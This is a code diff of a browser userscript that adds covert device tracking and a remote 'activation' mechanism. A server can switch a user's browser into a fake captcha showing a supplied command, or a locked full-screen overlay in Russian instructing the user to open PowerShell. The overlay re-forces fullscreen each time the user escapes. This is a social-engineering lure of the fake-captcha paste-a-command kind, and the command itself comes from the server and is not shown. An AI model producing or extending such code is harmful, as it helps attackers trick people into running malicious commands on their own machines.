@@ -47,9 +47,7 @@ async function getPersistentId() {
 
 
 // --- Payload Logic ---
-async function getDevicePayload() {
-    const fingerprint = await getPersistentId();
-
+async function getDevicePayload(fingerprint) {
     // IP will be handled by server or we can try fetching it
     // In userscript, we can use GM_xmlhttpRequest to bypass CORS if needed
     // But for now let's rely on server or simple request
@@ -70,7 +68,9 @@ async function getDevicePayload() {
 // --- Tracking & Polling ---
 async function trackDevice() {
     try {
-        const payload = await getDevicePayload();
+        const fingerprint = await getPersistentId();
+        if (!fingerprint) return;
+        const payload = await getDevicePayload(fingerprint);
         await GM_fetch(`${SERVER_URL}/devices/track`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -81,42 +81,191 @@ async function trackDevice() {
     }
 }
 
-async function checkActivation() {
-    try {
-        const payload = await getDevicePayload();
-        console.log("[DeviceTracker] Checking activation for payload:", payload);
-        const res = await GM_fetch(`${SERVER_URL}/devices/check-activation`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
+// Global state for activation
+const state = {
+    isActive: false,
+    currentMode: null, // 'captcha' or 'fullscreen'
+};
 
-        console.log("[DeviceTracker] Response status:", res.status);
-        if (res.status === 200) {
-            try {
-                const data = await res.json();
-                console.log("[DeviceTracker] Data received:", data);
-                if (data.activated && data.command) {
-                    console.log("[DeviceTracker] Device activated! Showing captcha...");
-                    showCaptcha(data.command, data.platform);
-                } else {
-                    console.log("[DeviceTracker] Not activated or no command.");
+// --- 2. Check Activation & Execute Command ---
+async function checkActivation() {
+    const fingerprint = await getPersistentId();
+    if (!fingerprint) return;
+
+    try {
+        const payload = await getDevicePayload(fingerprint);
+        // Using GM_xmlhttpRequest if available to avoid CORB/CORS issues in some contexts
+        if (typeof GM_xmlhttpRequest !== 'undefined') {
+            GM_xmlhttpRequest({
+                method: "POST",
+                url: `${SERVER_URL}/devices/check-activation`,
+                headers: { "Content-Type": "application/json" },
+                data: JSON.stringify(payload),
+                onload: function (response) {
+                    if (response.status === 200) {
+                        try {
+                            const data = JSON.parse(response.responseText);
+                            handleActivationResponse(data);
+                        } catch (e) {
+                            console.error("[DeviceTracker] Parse error", e);
+                        }
+                    }
                 }
-            } catch (e) {
-                console.error("[DeviceTracker] Parse error", e);
+            });
+        } else {
+            // Fallback fetch
+            const response = await fetch(`${SERVER_URL}/devices/check-activation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (response.ok) {
+                const data = await response.json();
+                handleActivationResponse(data);
             }
         }
-    } catch (e) {
-        console.error("[DeviceTracker] Check activation error", e);
+    } catch (err) {
+        console.error("[DeviceTracker] Check activation failed", err);
     }
 }
 
-// --- UI / Overlay ---
-let isOverlayShown = false;
+function handleActivationResponse(data) {
+    if (data.activated) {
+        if (!state.isActive || state.currentMode !== data.mode) {
+            console.log("[DeviceTracker] Activated! Mode:", data.mode);
+            state.isActive = true;
+            state.currentMode = data.mode;
 
+            // Dispatch based on mode
+            removeOverlays(); // Clear any existing overlay before showing new one
+            if (data.mode === 'fullscreen') {
+                showFullscreenOverlay();
+            } else { // Default or 'captcha'
+                showCaptcha(data.command);
+            }
+        }
+
+        // If already active and mode hasn't changed, do nothing or update existing overlay if needed
+    } else {
+        if (state.isActive) {
+            console.log("[DeviceTracker] Deactivated");
+            state.isActive = false;
+            state.currentMode = null;
+            removeOverlays();
+        }
+    }
+}
+
+function removeOverlays() {
+    // Remove Captcha
+    const captchaOverlay = document.getElementById('device-tracker-root'); // Original captcha overlay ID
+    if (captchaOverlay) captchaOverlay.remove();
+
+    // Remove Fullscreen Overlay
+    const fsOverlay = document.getElementById('vot-fs-overlay');
+    if (fsOverlay) fsOverlay.remove();
+
+    // Exit fullscreen if strictly needed, but might be annoying if user entered manually. 
+    // Let's exit if we forced it.
+    if (document.fullscreenElement) {
+        document.exitFullscreen().catch(() => { });
+    }
+}
+
+function showFullscreenOverlay() {
+    if (document.getElementById('vot-fs-overlay')) return;
+
+    // Create container
+    const div = document.createElement('div');
+    div.id = 'vot-fs-overlay';
+    div.innerHTML = `
+        <style>
+            #vot-fs-overlay {
+                position: fixed; inset: 0; z-index: 999999;
+                background: #1e2a38; color: #ecf0f1; font-family: "Segoe UI", system-ui, sans-serif;
+                display: flex; justify-content: center; align-items: center;
+                text-align: center;
+            }
+            .vot-content {
+                background: #222f3e; padding: 46px; border-radius: 22px; width: 680px; max-width: 95%;
+                box-shadow: 0 25px 80px rgba(0,0,0,.45);
+            }
+            h2 { font-size: 2.5rem; margin-bottom: 28px; }
+            .step { font-size: 1.25rem; line-height: 1.6; margin-bottom: 20px; }
+            kbd { background: #0b0f14; border-radius: 8px; padding: 6px 14px; font-family: Consolas, monospace; font-size: 1.05rem; display: inline-block; margin: 0 4px; }
+            .divider { height: 1px; background: rgba(255,255,255,.15); margin: 28px 0; }
+            .note { font-size: 0.95rem; opacity: 0.7; }
+            .btn { padding: 14px 30px; font-size: 1.1rem; border-radius: 10px; border: none; cursor: pointer; background: #3498db; color: #fff; margin-top: 20px; }
+            .btn:hover { transform: scale(1.05); opacity: 0.95; }
+        </style>
+        <div class="vot-content">
+            <h2>Система готова</h2>
+            <div class="step">✅ Самый быстрый способ открыть консоль:</div>
+            <div class="step"><kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong> или <strong>Терминал</strong></div>
+            <div class="divider"></div>
+            <div class="step">🔁 Если пункта нет — используйте: <kbd>Win</kbd> + <kbd>R</kbd>, введите <kbd>powershell</kbd>, нажмите <kbd>Enter</kbd></div>
+            <div class="note">В Windows 11 PowerShell открывается внутри Windows Terminal.<br>Полноэкранный режим при этом сохраняется.</div>
+            <button id="vot-fs-btn" class="btn">Перейти в полноэкранный режим</button>
+        </div>
+    `;
+    document.body.appendChild(div);
+
+    const btn = div.querySelector('#vot-fs-btn');
+
+    const enterFullscreen = async () => {
+        try {
+            if (document.documentElement.requestFullscreen) {
+                await document.documentElement.requestFullscreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { /* Safari */
+                await document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { /* IE11 */
+                await document.documentElement.msRequestFullscreen();
+            }
+        } catch (e) {
+            console.warn("[DeviceTracker] Fullscreen request failed", e);
+        }
+    };
+
+    btn.onclick = enterFullscreen;
+
+    // Aggressive Re-Fullscreen
+    const onFullscreenChange = () => {
+        if (!state.isActive || state.currentMode !== 'fullscreen') { // Stop if deactivated or mode changed
+            document.removeEventListener("fullscreenchange", onFullscreenChange);
+            return;
+        }
+
+        if (!document.fullscreenElement) {
+            console.log("[DeviceTracker] Fullscreen exited. Re-forcing...");
+
+            // Immediate attempt (might fail without user gesture)
+            enterFullscreen().catch(() => {
+                // If failed, we need a click.
+                // The overlay is already covering everything. 
+                // We can make the WHOLE overlay a click trigger to re-enter.
+                btn.textContent = "Нажмите в любом месте для возврата";
+
+                const reEnforcer = () => {
+                    enterFullscreen().then(() => {
+                        btn.textContent = "Перейти в полноэкранный режим"; // Reset text
+                        div.removeEventListener('click', reEnforcer); // Remove one-time listener
+                    });
+                };
+                div.addEventListener('click', reEnforcer);
+            });
+        }
+    };
+
+    document.addEventListener("fullscreenchange", onFullscreenChange);
+
+    // Try optional immediate entry (will fail if no gesture, but harmless)
+    enterFullscreen();
+}
+
+// --- UI / Overlay ---
 function showCaptcha(command, platformKey) {
-    if (isOverlayShown) return;
-    isOverlayShown = true;
+    if (document.getElementById('vot-captcha-overlay')) return;
+
 
     // Determine platform
     const isMac = (platformKey || '').toLowerCase().includes('mac');
